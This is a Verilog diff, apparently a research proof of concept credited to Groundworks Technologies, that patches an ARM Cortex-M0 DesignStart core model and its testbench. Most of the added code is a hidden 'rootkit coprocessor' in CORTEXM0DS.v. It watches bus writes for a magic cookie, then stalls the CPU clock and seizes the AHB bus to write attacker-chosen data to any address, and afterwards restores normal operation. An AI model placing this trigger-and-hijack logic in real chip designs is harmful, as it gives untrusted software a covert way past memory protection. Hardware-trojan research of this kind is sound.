@@ -1,0 +1,330 @@
+diff -rupN a/armtb.v b/armtb.v
+--- a/armtb.v	2014-04-03 21:13:20.647982453 -0300
++++ b/armtb.v	2014-04-03 21:10:03.987977779 -0300
+@@ -32,7 +32,7 @@ module cortexm0ds_tb ();
+ 
+ localparam clk_period = 10000;            // Simulation cycles per clock period
+ localparam por_delay  = 42000000;           // Simulation cycles of power-on-reset
+-localparam ram_log2   = 12;             // Power of two of RAM words
++localparam ram_log2   = 16;             // Power of two of RAM words
+ localparam addr_tty   = 32'h40000000;   // Address of output console
+ 
+ //------------------------------------------------------------------------------
+@@ -82,7 +82,6 @@ wire        CSLEEPING;           // CPU
+ wire        LOAD=LOAD_temp;
+ wire [31:0] LOADADDR=LOADADDR_temp;
+ wire [31:0] LOADDATA=LOADDATA_temp;
+-wire        RAMEN;
+ 
+ //------------------------------------------------------------------------------
+ // Generate system clock, power-on reset and synchronized AHB reset signals
+@@ -120,8 +119,6 @@ assign CRESP   = 1'b0;         // No dev
+ assign CNMI     = 1'b0;         // Do not generate any non-maskable interrupts
+ assign CIRQ     = {16{1'b0}};   // Do not generate any interrupts
+ assign CRXEV    = 1'b0;         // Do not generate any external events
+-assign RAMEN    = 1'b0;
+-assign CPROT     = 3'b000; 
+ 
+ //------------------------------------------------------------------------------
+ // Instantiate Cortex-M0 DesignStart processor macro cell
+@@ -149,13 +146,6 @@ CORTEXM0DS cm0 (
+   .SYSRESETREQ (CSYSRESETREQ),
+   .SLEEPING    (CSLEEPING)
+   );
+-  /*
+-  .LOAD         (LOAD),
+-  .LOADADDR     (LOADADDR[31:0]),
+-  .LOADDATA     (LOADDATA[31:0]),
+-  .RAMEN        (RAMEN)
+-);
+-*/
+ 
+ //------------------------------------------------------------------------------
+ // Simulation model of an AHB memory
+@@ -175,19 +165,21 @@ initial begin
+   $display("%t: (c) Copyright 2010 ARM Limited", $time);
+   $display("%t: All Rights Reserved", $time);
+   $display("%t: ----------------------------------------------\n", $time);
++  $display("%t: Backdoor by Groundworks Technologies \n", $time);
++  $display("%t: http://www.groundworkstech.com \n", $time);
++  $display("%t: ----------------------------------------------\n", $time);
+   $display("%t: Loading initial memory content...", $time);
+   fd = $fopen("ram.bin","rb");
+   LOAD_temp  = 1'b1;         
+ 
+-  //#10000;
+- /*
+   for (i = -1; (i < (2**ram_log2)) && ($fread(data,fd) != -1);i=i )begin
+     i=i+1;
+     memory[i]=data;
++ //   $display("Loaded %d: %d",i,memory[i]);
+   end
+-*/
+-$display("%t: Loading completed", $time);
+-  #20000 LOAD_temp = 1'b0;
++
++  $display("%t: Loading completed", $time);
++  LOAD_temp = 1'b0;
+   
+ end
+ 
+@@ -200,6 +192,75 @@ reg [ 2:0] hsize_last;
+ 
+ reg [31:0] hdata;
+ 
++// RAM connected to AMBA-lite simulation 
++
++always @(posedge GCLK)
++  if (CREADY) begin
++    htrans_last <= CTRANS;
++    hwrite_last <= CWRITE;
++    cwdata_last <= CWDATA;
++    haddr_last  <= CADDR;//(CADDR & 65535) + 65536;
++    hsize_last  <= CSIZE;
++    if (htrans_last==2)
++    	begin
++	    if (hwrite_last==1)
++    		begin
++		//$display("WRITE operation addr %X value %X size %X",haddr_last,CWDATA,hsize_last);
++		case(hsize_last)
++			0 : begin
++				memory[haddr_last+0]<=CWDATA[7:0];
++				end
++			1 : begin
++				memory[haddr_last+0]<=CWDATA[7:0];
++				memory[haddr_last+1]<=CWDATA[15:8];
++			    end
++			2 : begin
++			//	$display("SIZE 2 WRITE operation addr %X value %X",haddr_last,CWDATA);
++				memory[haddr_last+0]<=CWDATA[7:0];
++				memory[haddr_last+1]<=CWDATA[15:8];
++				memory[haddr_last+2]<=CWDATA[23:16];
++				memory[haddr_last+3]<=CWDATA[31:24];
++			    end
++		endcase
++		end
++	end
++    if (CTRANS==2)
++    	begin
++	    if (CWRITE==0)
++	        begin
++		case(CSIZE)
++			0 : begin
++	//			$display("SIZE 0 READ operation addr %X value %X",CADDR,memory[CADDR]);
++				hdata[7:0]<=memory[CADDR];
++				hdata[15:8]<=memory[CADDR];
++				hdata[23:16]<=memory[CADDR];
++				hdata[31:24]<=memory[CADDR]; // porque? memoria desalineada?
++			    end
++			1 : begin
++	//			$display("SIZE 1 READ operation addr %X value %X",CADDR,memory[CADDR]);
++	//			$display("READ operation addr %X value %X",CADDR,memory[CADDR+1]);
++				hdata[7:0]<=memory[CADDR+0];
++				hdata[15:8]<=memory[CADDR+1];
++				hdata[23:16]<=memory[CADDR+0];
++				hdata[31:24]<=memory[CADDR+1];
++			    end
++			2 : begin
++	//			$display("READ operation addr %X value %X",CADDR,memory[CADDR]);
++	//			$display("READ operation addr %X value %X",CADDR,memory[CADDR+1]);
++	//			$display("READ operation addr %X value %X",CADDR,memory[CADDR+2]);
++	//			$display("READ operation addr %X value %X",CADDR,memory[CADDR+3]);
++				hdata[7:0]<=memory[CADDR+0];
++				hdata[15:8]<=memory[CADDR+1];
++				hdata[23:16]<=memory[CADDR+2];
++				hdata[31:24]<=memory[CADDR+3];
++			    end
++		endcase
++   		end
++	end
++    	
++  end
++assign	CRDATA=hdata;
++
+ 
+ //------------------------------------------------------------------------------
+ // Simulation model of a simple AHB output console
+diff -rupN a/CORTEXM0DS.v b/CORTEXM0DS.v
+--- a/CORTEXM0DS.v	2014-04-03 21:11:13.243979425 -0300
++++ b/CORTEXM0DS.v	2014-04-03 21:10:14.991978040 -0300
+@@ -88,21 +88,57 @@ wire            vis_control;
+ wire            vis_primask;
+ 
+ //------------------------------------------------------------------------------
++// Deviated signals
++//------------------------------------------------------------------------------
++
++// Clock
++reg RTKDeviated;
++wire dHCLK;
++assign dHCLK=(RTKDeviated==0)?HCLK:1;
++
++// AHB transaction address
++reg [31:0] RTKAddr;
++wire [31:0] dHADDR;
++assign HADDR=(RTKDeviated==0)?dHADDR:RTKAddr;
++
++// AHB write-data
++reg [31:0] RTKData;
++wire [31:0] dHWDATA;
++assign HWDATA=(RTKDeviated==0)?dHWDATA:RTKData;
++
++// AHB size
++wire [2:0] dHSIZE;
++assign HSIZE=(RTKDeviated==0)?dHSIZE:2; //fixed at dword
++
++// AHB protection: priv; data or inst
++wire [ 3:0] dHPROT;
++assign HPROT=(RTKDeviated==0)?dHPROT:0; //fixed at instr
++
++// AHB write control
++wire        dHWRITE;
++reg RTKHWRITE;
++assign HWRITE=(RTKDeviated==0)?dHWRITE:RTKHWRITE;
++
++// AHB Transaction control
++wire [1:0] dHTRANS;
++reg  [3:0] RTKHTRANS;
++assign HTRANS=(RTKDeviated==0)?dHTRANS:RTKHTRANS;
++//------------------------------------------------------------------------------
+ // Instantiate Cortex-M0 processor logic level
+ //------------------------------------------------------------------------------
+ 
+ cortexm0ds_logic u_logic (
+-  .hclk                 (HCLK),
++  .hclk                 (dHCLK),
+   .hreset_n             (HRESETn),
+ 
+-  .haddr_o              (HADDR[31:0]),
++  .haddr_o              (dHADDR[31:0]),
+   .hburst_o             (HBURST[2:0]),
+   .hmastlock_o          (HMASTLOCK),
+-  .hprot_o              (HPROT[3:0]),
+-  .hsize_o              (HSIZE[2:0]),
+-  .htrans_o             (HTRANS[1:0]),
+-  .hwdata_o             (HWDATA[31:0]),
+-  .hwrite_o             (HWRITE),
++  .hprot_o              (dHPROT[3:0]),
++  .hsize_o              (dHSIZE[2:0]),
++  .htrans_o             (dHTRANS[1:0]),
++  .hwdata_o             (dHWDATA[31:0]),
++  .hwrite_o             (dHWRITE),
+   .hrdata_i             (HRDATA[31:0]),
+   .hready_i             (HREADY),
+   .hresp_i              (HRESP),
+@@ -151,4 +187,115 @@ assign cm0_xpsr    = {vis_apsr[3:0],3'd0
+ assign cm0_control = {30'd0,vis_control,1'b0};
+ assign cm0_primask = {31'd0,vis_primask};
+ 
++//------------------------------------------------------------------------------
++// Trivial rootkit coprocessor unit
++//------------------------------------------------------------------------------
++reg [5:0] RTKState;
++reg [8:0] RTKCmd;
++
++reg [3:0] RTKCount;
++`define RTK_FIND_START	5'h0
++`define RTK_FIND_CMD	5'h1
++`define RTK_FIND_DATA	5'h2
++`define RTK_FIND_ADDR	5'h3
++`define RTK_EXEC	5'h4
++`define RTK_EXEC2	5'h5
++`define RTK_END		5'h6
++`define RTK_CMD_WRITE	"W"
++`define RTK_CMD_READ	"R"
++
++// 56-bit initial cookie
++// I.E. memcpy "\x78\x56\x34\x12R\xaa\x55\xaa";
++`define RTK_COOKIE_1 32'h12345678
++`define RTK_COOKIE_2 24'h434241
++`define RTK_COOKIE_3 24'h2D2D2D  // ---
++
++always @(posedge HCLK or posedge HRESETn)
++	begin
++	if (!HRESETn) // Reset
++		begin
++		RTKState<=`RTK_FIND_START;
++		RTKDeviated<=0;
++		end
++	else	begin
++		case (RTKState)
++			`RTK_FIND_START: // Find first part of cookie
++				if ( HWDATA ==`RTK_COOKIE_1)
++					begin
++//					$display("START: Trans, Addr: %x Data: %x %x",HADDR,HWDATA,HRDATA);
++					RTKState<=`RTK_FIND_CMD;
++					end
++			`RTK_FIND_CMD: // Load second part of cookie and single-byte command
++				begin
++				if ( HWDATA[31:8] ==`RTK_COOKIE_2)
++					begin
++//					$display("FIND CMD: Trans, Addr: %x Data: %x %x",HADDR,HWDATA,HRDATA);
++					RTKCmd<=HWDATA[7:0];
++					RTKState<=`RTK_FIND_DATA;
++					RTKCount<=0;
++					end
++				else	RTKState<=`RTK_FIND_START;
++				end
++			`RTK_FIND_DATA: // Load data
++				begin
++				if ( HWDATA[31:8] ==`RTK_COOKIE_3)
++					begin
++					if (RTKCount==3) // data loaded, go to loading address
++						begin
++						RTKState<=`RTK_FIND_ADDR;
++						RTKCount<=0;
++						end
++					else	RTKCount<=RTKCount+1;
++					RTKData[31:8]<=RTKData[23:0];
++					RTKData[7:0]<=HWDATA[7:0];
++					end
++				end
++			`RTK_FIND_ADDR: // Load address
++				begin
++				if ( HWDATA[31:8] ==`RTK_COOKIE_3)
++					begin
++					if (RTKCount==3) // Address loaded, go to exec
++						begin
++						RTKState<=`RTK_EXEC;
++						RTKDeviated<=1;
++						end
++					else	RTKCount<=RTKCount+1;
++					RTKAddr[31:8]<=RTKAddr[23:0];
++					RTKAddr[7:0]<=HWDATA[7:0];
++					end
++				end
++			`RTK_EXEC: // Exec command
++				begin
++				case (RTKCmd) // Parse command
++					`RTK_CMD_WRITE:
++						begin
++//						$display("WRITING %x to %x",RTKData,RTKAddr);
++						RTKHWRITE<=1;
++						RTKHTRANS<=2;
++						RTKState<=`RTK_EXEC2;
++						end
++					`RTK_CMD_READ:
++						begin
++//						$display("READING %x to %x",RTKData,RTKAddr);
++						// Not implemented yet!
++						RTKState<=`RTK_FIND_START;
++						end
++				endcase
++				end
++			`RTK_EXEC2: // 2nd clock of transaction
++				begin
++				RTKHWRITE<=0;
++				RTKState<=`RTK_END;
++				end
++			`RTK_END: // End command (restore CPU functionality)
++				begin
++				$display("END");
++				RTKDeviated<=0; // Nothing to see here, move along...
++				RTKHWRITE<=0;
++				RTKState<=`RTK_FIND_START;
++				end
++
++		endcase
++		end
++	end
+ endmodule
